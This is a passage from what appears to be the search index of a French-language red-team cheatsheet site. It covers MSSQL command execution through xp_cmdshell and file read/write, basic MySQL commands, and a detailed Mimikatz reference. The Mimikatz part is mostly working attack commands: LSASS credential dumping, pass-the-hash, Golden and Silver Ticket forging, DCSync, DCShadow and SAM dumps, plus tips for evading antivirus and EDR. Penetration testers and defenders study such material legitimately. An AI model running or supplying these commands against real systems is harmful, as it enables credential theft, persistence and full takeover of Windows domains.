d\u2019effectuer des requ\u00eates inter-serveurs.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#lister-les-utilisateurs-sql-server","title":"Lister les utilisateurs SQL Server","text":"<pre><code>SELECT sp.name AS login, sp.type_desc AS login_type, sl.password_hash, \n       sp.create_date, sp.modify_date, \n       CASE WHEN sp.is_disabled = 1 THEN 'Disabled' ELSE 'Enabled' END AS status \nFROM sys.server_principals sp \nLEFT JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id \nWHERE sp.type NOT IN ('G', 'R') \nORDER BY sp.name;\n</code></pre> <p>Affiche la liste des utilisateurs SQL, leurs statuts (activ\u00e9/d\u00e9sactiv\u00e9) et d\u2019autres informations.</p> <p>[!Astuce] Utile pour v\u00e9rifier les comptes SQL et leurs statuts de connexion.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#activer-xp_cmdshell","title":"\ud83d\udcbb Activer <code>xp_cmdshell</code>","text":""},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#activer-lexecution-de-commandes-systeme","title":"Activer l\u2019ex\u00e9cution de commandes syst\u00e8me","text":"<pre><code>sp_configure 'show advanced options', '1'\nRECONFIGURE\nsp_configure 'xp_cmdshell', '1'\nRECONFIGURE\n</code></pre> <p>Active l'option xp_cmdshell, qui permet d\u2019ex\u00e9cuter des commandes syst\u00e8me depuis SQL Server.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#executer-une-commande-systeme","title":"\u26a1 Ex\u00e9cuter une commande syst\u00e8me","text":"<pre><code>EXEC master..xp_cmdshell 'whoami'\n</code></pre> <p>Ex\u00e9cute la commande <code>whoami</code> directement depuis SQL Server et affiche l\u2019utilisateur en cours.</p> <p>[!Astuce] Peut \u00eatre utilis\u00e9 pour v\u00e9rifier les permissions du compte SQL Server sur le syst\u00e8me.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#lire-ecrire-un-fichier","title":"\ud83d\udcdd Lire / \u00c9crire un fichier","text":""},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#verifier-si-nous-avons-la-permission-de-lire-un-fichier","title":"V\u00e9rifier si nous avons la permission de lire un fichier","text":"<pre><code>SELECT * FROM fn_my_permissions(NULL, 'SERVER') \nWHERE permission_name='ADMINISTER BULK OPERATIONS' \n   OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';\n</code></pre> <p>Affiche les permissions actuelles de l\u2019utilisateur SQL pour la lecture et l\u2019importation de fichiers.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#lire-un-fichier-depuis-le-systeme","title":"Lire un fichier depuis le syst\u00e8me","text":"<pre><code>SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents\n</code></pre> <p>Lit le contenu du fichier sp\u00e9cifi\u00e9 et affiche son contenu sous forme de texte.</p> <p>[!Astuce] Utile pour lire les fichiers syst\u00e8me directement via SQL Server.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MSSQL/#ecrire-dans-un-fichier-necessite-des-droits-dadministrateur","title":"\u00c9crire dans un fichier (n\u00e9cessite des droits d\u2019administrateur)","text":"<pre><code>sp_configure 'show advanced options', 1\nRECONFIGURE\nsp_configure 'Ole Automation Procedures', 1\nRECONFIGURE\n\nDECLARE @OLE INT\nDECLARE @FileID INT\n\nEXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT\nEXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\fichier.txt', 8, 1\nEXECUTE sp_OAMethod @FileID, 'WriteLine', Null, 'Coucou :)'\nEXECUTE sp_OADestroy @FileID\nEXECUTE sp_OADestroy @OLE\n</code></pre> <p>Cr\u00e9e un fichier texte et y \u00e9crit du contenu directement depuis SQL Server.</p> <ul> <li><code>sp_OACreate</code> : Cr\u00e9e une instance de l\u2019objet Scripting.FileSystemObject</li> <li><code>OpenTextFile</code> : Ouvre ou cr\u00e9e un fichier en mode \u00e9criture</li> <li><code>WriteLine</code> : \u00c9crit du texte dans le fichier</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/","title":"MySQL","text":""},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#gestion-des-bases-de-donnees","title":"\ud83d\udee0 Gestion des bases de donn\u00e9es","text":""},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#creer-une-base-de-donnees","title":"Cr\u00e9er une base de donn\u00e9es","text":"<pre><code>CREATE DATABASE nomDB;\n</code></pre> <p>Cr\u00e9e une nouvelle base de donn\u00e9es nomDB.</p> <p>[!Astuce] Utilise <code>IF NOT EXISTS</code> pour \u00e9viter une erreur si la base existe d\u00e9j\u00e0 :</p> <p><pre><code>CREATE DATABASE IF NOT EXISTS nomDB;\n</code></pre> </p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#lister-les-bases-de-donnees-disponibles","title":"Lister les bases de donn\u00e9es disponibles","text":"<pre><code>SHOW DATABASES;\n</code></pre> <p>Affiche la liste des bases de donn\u00e9es disponibles sur le serveur.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#selectionner-une-base-de-donnees","title":"S\u00e9lectionner une base de donn\u00e9es","text":"<pre><code>USE nomDB;\n</code></pre> <p>Change la base de donn\u00e9es active pour ex\u00e9cuter les commandes suivantes \u00e0 l\u2019int\u00e9rieur de <code>nomDB</code>.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#gestion-des-tables","title":"\ud83d\udccb Gestion des tables","text":""},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#creer-une-table-dans-une-base-de-donnees","title":"Cr\u00e9er une table dans une base de donn\u00e9es","text":"<pre><code>CREATE TABLE logins (\n    id INT,\n    username VARCHAR(100),\n    password VARCHAR(100),\n    date_of_joining DATETIME\n);\n</code></pre> <p>Cr\u00e9e une table <code>logins</code> avec plusieurs colonnes :</p> <ul> <li><code>id</code> \u2192 un entier</li> <li><code>username</code> et <code>password</code> \u2192 cha\u00eenes de 100 caract\u00e8res</li> <li><code>date_of_joining</code> \u2192 une date et heure</li> </ul> <p>[!Astuce] Ajouter <code>PRIMARY KEY(id)</code> permet d'avoir un identifiant unique.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#lister-les-tables-dune-base-de-donnees","title":"Lister les tables d\u2019une base de donn\u00e9es","text":"<pre><code>SHOW TABLES;\n</code></pre> <p>Affiche toutes les tables pr\u00e9sentes dans la base de donn\u00e9es s\u00e9lectionn\u00e9e.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#afficher-la-structure-dune-table","title":"Afficher la structure d\u2019une table","text":"<pre><code>DESCRIBE $nomTable;\n</code></pre> <p>Affiche les colonnes d\u2019une table, leur type, cl\u00e9 primaire, valeurs par d\u00e9faut, etc.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#manipulation-des-donnees","title":"\u270f\ufe0f Manipulation des donn\u00e9es","text":""},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#inserer-un-enregistrement-complet-dans-une-table","title":"Ins\u00e9rer un enregistrement complet dans une table","text":"<pre><code>INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);\n</code></pre> <p>Ajoute un nouvel enregistrement en renseignant toutes les colonnes de la table.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#inserer-un-enregistrement-avec-certaines-colonnes-uniquement","title":"Ins\u00e9rer un enregistrement avec certaines colonnes uniquement","text":"<pre><code>INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);\n</code></pre> <p>Ajoute un enregistrement en ne remplissant que certaines colonnes, les autres prennent leur valeur par d\u00e9faut.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#inserer-plusieurs-enregistrements-en-une-seule-requete","title":"Ins\u00e9rer plusieurs enregistrements en une seule requ\u00eate","text":"<pre><code>INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');\n</code></pre> <p>Ajoute plusieurs utilisateurs d\u2019un coup, ce qui est plus performant.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#requetes-de-selection","title":"\ud83d\udcca Requ\u00eates de s\u00e9lection","text":""},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#afficher-tous-les-enregistrements-dune-table","title":"Afficher tous les enregistrements d\u2019une table","text":"<pre><code>SELECT * FROM $nomTable;\n</code></pre> <p>Retourne toutes les lignes et colonnes d\u2019une table.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#afficher-uniquement-certaines-colonnes-dune-table","title":"Afficher uniquement certaines colonnes d\u2019une table","text":"<pre><code>SELECT column1, column2 FROM table_name;\n</code></pre> <p>Ne retourne que les colonnes sp\u00e9cifi\u00e9es.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#modification-de-la-structure-des-tables","title":"\ud83d\udd27 Modification de la structure des tables","text":""},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#ajouter-une-nouvelle-colonne","title":"Ajouter une nouvelle colonne","text":"<pre><code>ALTER TABLE $nomTable ADD $nomColonne INT;\n</code></pre> <p>Ajoute une colonne de type INT \u00e0 une table existante.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#renommer-une-colonne","title":"Renommer une colonne","text":"<pre><code>ALTER TABLE $nomTable RENAME COLUMN $ancienNom TO $nouveauNom;\n</code></pre> <p>Modifie le nom d'une colonne existante.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#modifier-le-type-dune-colonne","title":"Modifier le type d\u2019une colonne","text":"<pre><code>ALTER TABLE $nomTable MODIFY $nomColonne DATE;\n</code></pre> <p>Change le type d\u2019une colonne existante.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#supprimer-une-colonne","title":"Supprimer une colonne","text":"<pre><code>ALTER TABLE $nomTable DROP $nomColonne;\n</code></pre> <p>Supprime une colonne d\u00e9finitivement.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#mise-a-jour-des-enregistrements","title":"\ud83d\udd04 Mise \u00e0 jour des enregistrements","text":""},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#modifier-les-valeurs-dune-colonne-pour-certains-enregistrements","title":"Modifier les valeurs d\u2019une colonne pour certains enregistrements","text":"<pre><code>UPDATE logins SET password = 'change_password' WHERE id &gt; 1;\n</code></pre> <p>Modifie la colonne <code>password</code> de tous les utilisateurs dont <code>id</code> est sup\u00e9rieur \u00e0 1.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#suppression-de-donnees","title":"\u274c Suppression de donn\u00e9es","text":""},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#supprimer-un-enregistrement-specifique","title":"Supprimer un enregistrement sp\u00e9cifique","text":"<pre><code>DELETE FROM logins WHERE id = 3;\n</code></pre> <p>Supprime l\u2019utilisateur dont <code>id</code> est <code>3</code>.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#supprimer-tous-les-enregistrements-dune-table-sans-supprimer-la-table-elle-meme","title":"Supprimer tous les enregistrements d\u2019une table (sans supprimer la table elle-m\u00eame)","text":"<pre><code>DELETE FROM logins;\n</code></pre> <p>[!Attention] Cette commande supprime toutes les donn\u00e9es de la table <code>logins</code>, mais conserve la table.</p>"},{"location":"Red%20Team/Cheatsheets/Base%20de%20donn%C3%A9es/MySQL/#supprimer-une-table-entiere","title":"Supprimer une table enti\u00e8re","text":"<pre><code>DROP TABLE logins;\n</code></pre> <p>Supprime d\u00e9finitivement la table et toutes ses donn\u00e9es.</p>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/","title":"Mimikatz","text":"<p>Objectif : Mimikatz est un outil post-exploitation incontournable pour Windows, sp\u00e9cialis\u00e9 dans l'extraction d'identifiants (mots de passe en clair, hashes, tickets Kerberos, secrets DPAPI, etc.) de la m\u00e9moire, du registre ou du syst\u00e8me de fichiers. Il permet \u00e9galement de manipuler les tickets Kerberos (Golden/Silver Tickets) et d'interagir avec Active Directory (DCSync, DCShadow).</p> <p>Source : https://github.com/gentilkiwi/mimikatz</p> <p>Pr\u00e9requis G\u00e9n\u00e9ral : La plupart des commandes puissantes de Mimikatz n\u00e9cessitent des privil\u00e8ges \u00e9lev\u00e9s (Administrateur local ou <code>NT AUTHORITY\\SYSTEM</code>).</p> <p>OPSEC : Mimikatz est extr\u00eamement surveill\u00e9 par les antivirus et EDR. Son utilisation directe sur disque est souvent bloqu\u00e9e. Privil\u00e9giez l'ex\u00e9cution en m\u00e9moire (ex: via <code>Invoke-Mimikatz</code> en PowerShell) ou utilisez des versions modifi\u00e9es/obfusqu\u00e9es. Les actions comme l'acc\u00e8s \u00e0 LSASS sont fortement audit\u00e9es.</p>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#module-privilege-gestion-des-privileges","title":"\ud83d\udd11 Module <code>privilege</code> (Gestion des privil\u00e8ges)","text":""},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#activer-le-privilege-de-debogage","title":"Activer le privil\u00e8ge de d\u00e9bogage","text":"<pre><code>privilege::debug\n</code></pre> <ul> <li>Contexte : Indispensable pour la plupart des op\u00e9rations n\u00e9cessitant un acc\u00e8s \u00e0 la m\u00e9moire d'autres processus, notamment LSASS.</li> <li>Usage : C'est souvent la premi\u00e8re commande \u00e0 ex\u00e9cuter apr\u00e8s avoir lanc\u00e9 Mimikatz avec des droits \u00e9lev\u00e9s.</li> <li>Pr\u00e9requis : Administrateur local ou un compte avec le privil\u00e8ge <code>SeDebugPrivilege</code>.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#module-sekurlsa-extraction-depuis-lsass","title":"\ud83d\ude31 Module <code>sekurlsa</code> (Extraction depuis LSASS)","text":"<p>[!Attention] L'acc\u00e8s au processus LSASS (Local Security Authority Subsystem Service) est tr\u00e8s sensible et fortement surveill\u00e9. N\u00e9cessite des privil\u00e8ges \u00e9lev\u00e9s (Admin/SYSTEM) et <code>privilege::debug</code>.</p>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#extraire-tous-les-identifiants-disponibles-de-lsass","title":"Extraire tous les identifiants disponibles de LSASS","text":"<pre><code>sekurlsa::logonpasswords\n</code></pre> <ul> <li>Contexte : Tente d'extraire les identifiants (mots de passe en clair si WDigest est activ\u00e9 ou si des sessions RDP r\u00e9centes existent, hashes NTLM, tickets Kerberos) des sessions utilisateurs actuellement connect\u00e9es et stock\u00e9es en m\u00e9moire par LSASS.</li> <li>Usage : Commande principale pour la r\u00e9colte d'identifiants sur une machine compromise.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#extraire-les-identifiants-wdigest","title":"Extraire les identifiants WDigest","text":"<pre><code>sekurlsa::wdigest\n</code></pre> <ul> <li>Contexte : Cible sp\u00e9cifiquement les identifiants stock\u00e9s par le fournisseur WDigest. Si la cl\u00e9 de registre <code>UseLogonCredential</code> est activ\u00e9e (par d\u00e9faut sur &lt;= Win 8/2012, d\u00e9sactiv\u00e9 apr\u00e8s mais r\u00e9activable), les mots de passe en clair peuvent \u00eatre r\u00e9cup\u00e9r\u00e9s.</li> <li>Usage : Utile pour obtenir des mots de passe en clair sur des syst\u00e8mes plus anciens ou mal configur\u00e9s.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#extraire-les-identifiants-kerberos","title":"Extraire les identifiants Kerberos","text":"<pre><code>sekurlsa::kerberos\n</code></pre> <ul> <li>Contexte : Extrait les tickets Kerberos (TGT, TGS) et les cl\u00e9s associ\u00e9es (RC4, AES) de la m\u00e9moire LSASS.</li> <li>Usage : Permet de r\u00e9cup\u00e9rer des tickets pour des attaques Pass-The-Ticket (PTT) ou Pass-The-Key.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#extraire-les-cles-de-chiffrement-kerberos-ekeys","title":"Extraire les cl\u00e9s de chiffrement Kerberos (eKeys)","text":"<pre><code>sekurlsa::ekeys\n</code></pre> <ul> <li>Contexte : Liste les cl\u00e9s de session Kerberos (AES, DES, RC4) stock\u00e9es en m\u00e9moire.</li> <li>Usage : Principalement pour l'analyse ou des attaques Pass-The-Key sp\u00e9cifiques.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#extraire-les-identifiants-ssp-security-support-provider","title":"Extraire les identifiants SSP (Security Support Provider)","text":"<pre><code>sekurlsa::ssp\n</code></pre> <ul> <li>Contexte : R\u00e9cup\u00e8re les identifiants captur\u00e9s par le fournisseur SSP, s'il est charg\u00e9 en m\u00e9moire (peut \u00eatre ajout\u00e9 par un attaquant pour la persistance).</li> <li>Usage : V\u00e9rifier si des identifiants sont captur\u00e9s par ce biais.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#extraire-les-identifiants-du-credential-manager","title":"Extraire les identifiants du Credential Manager","text":"<pre><code>sekurlsa::credman\n</code></pre> <ul> <li>Contexte : Affiche les identifiants (mots de passe pour des partages r\u00e9seau, RDP, sites web via IE/Edge) sauvegard\u00e9s par l'utilisateur via le Gestionnaire d'identification Windows.</li> <li>Usage : R\u00e9cup\u00e9rer des mots de passe sauvegard\u00e9s par les utilisateurs.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#extraire-le-hash-ntlm-du-compte-krbtgt","title":"Extraire le hash NTLM du compte <code>krbtgt</code>","text":"<pre><code>sekurlsa::krbtgt\n</code></pre> <ul> <li>Contexte : Cible sp\u00e9cifiquement les informations du compte <code>krbtgt</code> du domaine, dont le hash NTLM est essentiel pour forger des Golden Tickets.</li> <li>Usage : \u00c9tape cruciale pour obtenir le hash <code>krbtgt</code> depuis la m\u00e9moire d'un contr\u00f4leur de domaine (DC).</li> <li>Pr\u00e9requis : Doit \u00eatre ex\u00e9cut\u00e9 sur un DC avec des privil\u00e8ges de Domain Admin ou SYSTEM.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#extraire-les-tickets-kerberos-tgt-tgs","title":"Extraire les tickets Kerberos (TGT, TGS)","text":"<pre><code>sekurlsa::tickets [/export]\n</code></pre> <ul> <li>Contexte : Similaire \u00e0 <code>sekurlsa::kerberos</code>, mais se concentre sur l'affichage et l'exportation des tickets Kerberos.</li> <li>Usage : R\u00e9cup\u00e9rer des tickets pour une analyse hors ligne ou pour les r\u00e9utiliser avec <code>/export</code> (g\u00e9n\u00e8re des fichiers <code>.kirbi</code>).</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#attaque-pass-the-hash-pth","title":"Attaque Pass-The-Hash (PtH)","text":"<pre><code>sekurlsa::pth /user:&lt;username&gt; /domain:&lt;domain&gt; /ntlm:&lt;ntlm_hash&gt; [/run:&lt;program&gt;]\n</code></pre> <ul> <li>Contexte : Lance un nouveau processus (par d\u00e9faut <code>cmd.exe</code>) sous l'identit\u00e9 de l'utilisateur sp\u00e9cifi\u00e9 en utilisant son hash NTLM au lieu de son mot de passe pour l'authentification r\u00e9seau.</li> <li>Usage : Mouvement lat\u00e9ral ou \u00e9l\u00e9vation de privil\u00e8ges si le hash d'un admin est connu. Ne fonctionne que pour l'authentification NTLM (pas Kerberos).</li> <li>Options cl\u00e9s :<ul> <li><code>/run:</code> : Programme \u00e0 lancer (ex: <code>powershell.exe</code>).</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#travailler-avec-un-dump-memoire-de-lsass","title":"Travailler avec un dump m\u00e9moire de LSASS","text":"<pre><code>sekurlsa::minidump &lt;lsass_dump_file.dmp&gt;\nsekurlsa::logonpasswords\n# ... (autres commandes sekurlsa)\n</code></pre> <ul> <li>Contexte : Permet d'analyser un fichier dump du processus LSASS (cr\u00e9\u00e9 avec Procdump, Task Manager, etc.) pour extraire les identifiants hors ligne, sans interagir directement avec le processus LSASS sur la machine cible (plus discret).</li> <li>Usage : Analyse post-mortem ou pour \u00e9viter la d\u00e9tection directe sur la machine compromise.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#module-kerberos-manipulation-de-tickets-kerberos","title":"\ud83d\udc15 Module <code>kerberos</code> (Manipulation de tickets Kerberos)","text":""},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#creer-un-golden-ticket","title":"Cr\u00e9er un Golden Ticket","text":"<pre><code>kerberos::golden /user:&lt;username&gt; /domain:&lt;domain.fqdn&gt; /sid:&lt;domain_sid&gt; /krbtgt:&lt;krbtgt_ntlm_hash&gt; [/groups:&lt;rid1,rid2,...&gt;] [/id:&lt;user_rid&gt;] [/ptt] [/ticket:&lt;ticket.kirbi&gt;]\n</code></pre> <ul> <li>Contexte : Forge un faux Ticket Granting Ticket (TGT) Kerberos en utilisant le hash NTLM du compte <code>krbtgt</code> du domaine. Ce ticket donne des privil\u00e8ges \u00e9quivalents \u00e0 un Domain Admin (ou personnalis\u00e9s) sur l'ensemble du domaine.</li> <li>Usage : Persistance ultime et acc\u00e8s total au domaine.</li> <li>Pr\u00e9requis : N\u00e9cessite le nom de domaine, le SID du domaine, et le hash NTLM du compte <code>krbtgt</code>.</li> <li>Options cl\u00e9s :<ul> <li><code>/user:</code> : Nom de l'utilisateur \u00e0 usurper (peut \u00eatre inexistant).</li> <li><code>/domain:</code>, <code>/sid:</code> : Infos du domaine cible.</li> <li><code>/krbtgt:</code> : Hash NTLM du compte <code>krbtgt</code>.</li> <li><code>/groups:</code> : (Optionnel) RIDs des groupes \u00e0 inclure (par d\u00e9faut: groupes admins). <code>512</code> (Domain Admins) est souvent utilis\u00e9.</li> <li><code>/id:</code> : (Optionnel) RID de l'utilisateur \u00e0 usurper (par d\u00e9faut: 500 - Administrator).</li> <li><code>/ptt</code> : Injecte le Golden Ticket dans la session courante.</li> <li><code>/ticket:</code> : Sauvegarde le ticket dans un fichier <code>.kirbi</code>.</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#creer-un-silver-ticket","title":"Cr\u00e9er un Silver Ticket","text":"<pre><code>kerberos::golden /user:&lt;username&gt; /domain:&lt;domain.fqdn&gt; /sid:&lt;domain_sid&gt; /target:&lt;target_server.fqdn&gt; /service:&lt;service_spn&gt; /rc4:&lt;service_account_ntlm_hash&gt; [/groups:&lt;rid1,...&gt;] [/id:&lt;user_rid&gt;] [/ptt] [/ticket:&lt;ticket.kirbi&gt;]\n</code></pre> <ul> <li>Contexte : Forge un faux Ticket Granting Service (TGS) pour un service sp\u00e9cifique (ex: CIFS, HTTP) sur un serveur cible. Ne n\u00e9cessite que le hash du compte de service (ordinateur ou utilisateur) ex\u00e9cutant le service cibl\u00e9.</li> <li>Usage : Acc\u00e8s persistant \u00e0 un service sp\u00e9cifique sans avoir besoin du hash <code>krbtgt</code>. Utile pour acc\u00e9der \u00e0 des partages de fichiers (CIFS), des sites web (HTTP), etc.</li> <li>Pr\u00e9requis : N\u00e9cessite le nom de domaine, le SID du domaine, le FQDN du serveur cible, le SPN du service, et le hash NTLM du compte de service.</li> <li>Options cl\u00e9s :<ul> <li><code>/target:</code> : FQDN du serveur h\u00e9bergeant le service.</li> <li><code>/service:</code> : SPN du service (ex: <code>cifs</code>, <code>http</code>).</li> <li><code>/rc4:</code> : Hash NTLM du compte de service (souvent le compte machine du serveur cible, ex: <code>DC01$</code>).</li> <li>Autres options similaires \u00e0 Golden Ticket.</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#lister-les-tickets-kerberos-dans-la-session","title":"Lister les tickets Kerberos dans la session","text":"<pre><code>kerberos::list [/export]\n</code></pre> <ul> <li>Contexte : Affiche les tickets Kerberos pr\u00e9sents dans la session utilisateur actuelle.</li> <li>Usage : Similaire \u00e0 <code>sekurlsa::tickets</code> mais via le module <code>kerberos</code>. <code>/export</code> sauvegarde les tickets en fichiers <code>.kirbi</code>.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#purger-les-tickets-kerberos-de-la-session","title":"Purger les tickets Kerberos de la session","text":"<pre><code>kerberos::purge\n</code></pre> <ul> <li>Contexte : Supprime tous les tickets Kerberos de la session utilisateur actuelle.</li> <li>Usage : Utile pour forcer une nouvelle authentification ou nettoyer apr\u00e8s une injection PTT.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#pass-the-ticket-ptt","title":"Pass-The-Ticket (PTT)","text":"<pre><code>kerberos::ptt &lt;ticket.kirbi | ticket_base64&gt;\n</code></pre> <ul> <li>Contexte : Injecte un ticket Kerberos (TGT ou TGS) sauvegard\u00e9 (fichier <code>.kirbi</code> ou encod\u00e9 en Base64) dans la session courante.</li> <li>Usage : Permet d'utiliser un ticket obtenu pr\u00e9c\u00e9demment (via <code>dump</code>, <code>asktgt</code>, <code>asktgs</code>, Golden/Silver Ticket, etc.) pour usurper une identit\u00e9.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#demander-un-tgt","title":"Demander un TGT","text":"<pre><code>kerberos::ask /target:&lt;kdc.domain.fqdn&gt;\n</code></pre> <ul> <li>Contexte : Tente d'obtenir un TGT pour l'utilisateur courant aupr\u00e8s du KDC sp\u00e9cifi\u00e9.</li> <li>Usage : Moins courant que <code>asktgt</code> mais peut \u00eatre utile dans certains sc\u00e9narios.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#module-lsadump-interaction-avec-lsa-et-sam","title":"\ud83d\ude31 Module <code>lsadump</code> (Interaction avec LSA et SAM)","text":"<p>[!Attention] Certaines commandes n\u00e9cessitent des privil\u00e8ges \u00e9lev\u00e9s et/ou un acc\u00e8s r\u00e9seau au DC.</p>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#dcsync-replication-des-secrets-ad","title":"DCSync (R\u00e9plication des secrets AD)","text":"<pre><code>lsadump::dcsync /domain:&lt;domain.fqdn&gt; /user:&lt;username_cible&gt; [/all] [/dc:&lt;dc_name&gt;]\n</code></pre> <ul> <li>Contexte : Simule le comportement d'un contr\u00f4leur de domaine demandant la r\u00e9plication des donn\u00e9es d'identification (hashes NTLM) pour un utilisateur sp\u00e9cifique ou tous les utilisateurs.</li> <li>Usage : Moyen puissant d'obtenir les hashes NTLM des comptes du domaine (y compris <code>krbtgt</code>, admins) sans avoir besoin d'ex\u00e9cuter du code sur le DC lui-m\u00eame.</li> <li>Pr\u00e9requis : N\u00e9cessite des privil\u00e8ges de r\u00e9plication d'annuaire (g\u00e9n\u00e9ralement Domain Admin ou \u00e9quivalent).</li> <li>Options cl\u00e9s :<ul> <li><code>/user:</code> : Compte sp\u00e9cifique \u00e0 cibler.</li> <li><code>/all</code> : Tente de dumper les hashes de tous les comptes.</li> <li><code>/dc:</code> : Sp\u00e9cifie le DC \u00e0 contacter.</li> </ul> </li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#dcshadow-injection-dobjets-ad-malveillants","title":"DCShadow (Injection d'objets AD malveillants)","text":"<pre><code># (Commandes complexes, voir documentation Mimikatz)\nlsadump::dcshadow /object:&lt;dn&gt; /attribute:&lt;attr&gt; /value:&lt;val&gt;\nlsadump::dcshadow /push\n</code></pre> <ul> <li>Contexte : Technique avanc\u00e9e permettant \u00e0 une machine non-DC d'enregistrer temporairement un faux DC aupr\u00e8s de l'AD, puis de pousser des modifications malveillantes (ex: modifier l'appartenance \u00e0 un groupe, ajouter un SID History) qui seront r\u00e9pliqu\u00e9es par les vrais DCs.</li> <li>Usage : Persistance, modification furtive d'objets AD.</li> <li>Pr\u00e9requis : Privil\u00e8ges \u00e9lev\u00e9s (souvent Domain Admin) pour enregistrer le faux DC.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#dump-des-secrets-lsa-locaux","title":"Dump des secrets LSA locaux","text":"<pre><code>lsadump::lsa [/inject] [/patch]\n</code></pre> <ul> <li>Contexte : Extrait les secrets stock\u00e9s par la LSA (Local Security Authority) sur la machine locale. Cela peut inclure les mots de passe de comptes de service, les cl\u00e9s DPAPI, etc.</li> <li>Usage : R\u00e9cup\u00e9ration de secrets syst\u00e8me locaux.</li> <li>Pr\u00e9requis : Privil\u00e8ges SYSTEM. <code>/inject</code> tente d'injecter dans le processus LSA, <code>/patch</code> tente de patcher en m\u00e9moire.</li> </ul>"},{"location":"Red%20Team/Cheatsheets/Tools/Mimikatz/#dump-de-la-base-sam-locale","title":"Dump de la base SAM locale","text":"<pre><code>lsadump::sam [/system:&lt;system_hive&gt;] [/sam:&lt;sam_hive&gt;]\n</code></pre> <ul> <li>Contexte : Extrait les hashes NTLM des comptes utilisateurs locaux stock\u00e9s dans la base SAM (Security Account Manager).</li> 